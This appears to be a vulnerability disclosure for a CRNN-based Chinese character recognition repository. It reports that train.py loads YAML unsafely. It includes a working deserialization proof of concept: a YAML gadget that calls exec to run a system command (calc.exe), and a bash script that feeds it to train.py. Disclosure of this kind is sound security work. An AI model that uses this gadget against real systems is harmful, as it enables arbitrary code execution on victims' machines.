## ✍️ Description
A Chinese characters recognition repository based on convolutional recurrent networks.
* **Vulnerability description**
Vulnerable to YAML deserialization attack caused by unsafe loading.
## 🕵️‍♂️ Proof of Concept
* create and run exploit.sh and exploit.yml as shown below
* vulnerable part of code
```
https://github.com/Sierkinhane/CRNN_Chinese_Characters_Rec/blob/stable/train.py#L26
```
* exploit.yml
```YAML
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
```
* exploit.sh
```bash
#!/bin/bash
git clone https://github.com/Sierkinhane/CRNN_Chinese_Characters_Rec.git
cd CRNN_Chinese_Characters_Rec
python3 train.py --cfg path_to_exploit.yml
```
![CRNN_Chinese_Characters_Rec_POC](https://user-images.githubusercontent.com/43377443/105637184-1e35a380-5e92-11eb-8064-356d5c6c9169.PNG)
